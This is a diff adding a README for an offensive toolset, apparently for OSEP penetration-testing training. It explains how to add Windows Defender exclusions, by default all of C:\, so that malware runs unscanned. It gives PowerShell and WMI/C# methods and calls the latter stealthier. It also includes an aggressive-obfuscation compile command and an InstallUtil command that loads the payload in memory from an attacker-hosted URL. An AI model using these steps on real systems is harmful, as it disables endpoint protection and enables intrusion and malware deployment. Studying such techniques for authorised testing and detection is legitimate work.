@@ -1,0 +1,44 @@
+# OSEP Defender Exclusion Toolset
+
+This toolset adds paths to the Windows Defender exclusion list, allowing your malware/tools to run without being scanned.
+
+### HOW IT WORKS
+- **PowerShell Version**: Uses the built-in `Add-MpPreference` cmdlet. This is standard but can be logged by PowerShell script block logging.
+- **C# Version**: Uses WMI (`root\Microsoft\Windows\Defender:MSFT_MpPreference`) to inject the exclusion. This is stealthier as it avoids suspicious PowerShell cmdlets and can be run entirely in memory.
+
+### PREREQUISITES
+- **Permissions**: **HIGH INTEGRITY (ADMIN)** is mandatory. You cannot modify Defender exclusions as a normal user.
+
+---
+
+### OPTION 1: PowerShell (Add-Exclusion.ps1)
+Run directly on the target or via a shell:
+
+# Default (Adds C:\)
+PS> .\Add-Exclusion.ps1
+
+# Custom Path
+PS> .\Add-Exclusion.ps1 -Path "C:\Users\Public\Downloads"
+
+---
+
+### OPTION 2: C# (Add-Exclusion.cs)
+Best used with the OSEP AssemblyLoader to run in memory.
+
+#### STEP 1: Compile
+$ python3 /home/kali/OSEP-TOOLS/PayloadCompiler/PayloadCompiler.py \
+    -p /home/kali/OSEP-TOOLS/Helpers/AVDisarm/Add-Exclusion/Add-Exclusion.cs \
+    -m classic \
+    --obfuscate aggressive \
+    -o AddExclusion.exe
+
+#### STEP 2: Execute (via AssemblyLoader)
+Host the file on Kali and run via InstallUtil:
+
+C:\...>installutil.exe /U /URL=http://<KALI_IP>/AddExclusion.exe /ARGS="C:\" AssemblyLoader.exe
+
+---
+
+### VERIFICATION
+The tools will automatically print the current exclusion list after execution. You can also verify manually:
+PS> Get-MpPreference | select ExclusionPath
